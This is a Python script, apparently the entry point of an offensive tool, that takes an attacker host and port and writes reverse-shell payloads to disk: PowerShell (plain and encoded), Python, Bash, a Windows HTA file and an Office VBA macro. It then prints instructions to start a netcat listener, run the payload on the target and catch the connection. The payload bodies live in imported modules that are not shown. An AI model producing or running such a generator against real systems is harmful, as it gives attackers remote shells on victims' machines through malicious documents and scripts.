#!/usr/bin/env python3
import sys
import os
from generators.powershell import PowerShellGenerator
from generators.python_shell import PythonShellGenerator
from generators.bash import BashGenerator
from generators.windows import WindowsPayloadGenerator
from generators.office import OfficeMacroGenerator

class PayloadGenerator:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        
        # Initialize generators
        self.ps_gen = PowerShellGenerator(lhost, lport)
        self.py_gen = PythonShellGenerator(lhost, lport)
        self.bash_gen = BashGenerator(lhost, lport)
        self.win_gen = WindowsPayloadGenerator(lhost, lport)
        self.office_gen = OfficeMacroGenerator(lhost, lport)
    
    def generate_all(self, output_dir="payloads"):
        """Generate all payload types"""
        os.makedirs(output_dir, exist_ok=True)
        
        print(f"[*] Generating payloads for {self.lhost}:{self.lport}")
        print(f"[*] Output directory: {output_dir}\n")
        
        payloads = {
            'shell.ps1': self.ps_gen.generate_reverse_shell(),
            'shell_encoded.txt': self.ps_gen.generate_encoded_command(
                self.ps_gen.generate_reverse_shell()
            ),
            'shell.py': self.py_gen.generate_reverse_shell(),
            'shell.sh': self.bash_gen.generate_reverse_shell(),
            'shell.hta': self.win_gen.generate_hta_payload(),
            'macro.vba': self.office_gen.generate_vba_macro()
        }
        
        for filename, content in payloads.items():
            filepath = os.path.join(output_dir, filename)
            with open(filepath, 'w') as f:
                f.write(content)
            print(f"[+] Generated: {filepath}")
        
        print(f"\n[+] All payloads generated successfully!")
        print(f"\n[*] Usage:")
        print(f"    1. Start listener: nc -lvnp {self.lport}")
        print(f"    2. Execute payload on target")
        print(f"    3. Receive connection")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 main.py <LHOST> <LPORT>")
        print("Example: python3 main.py 10.10.14.5 4444")
        sys.exit(1)
    
    lhost = sys.argv[1]
    lport = sys.argv[2]
    
    generator = PayloadGenerator(lhost, lport)
    generator.generate_all()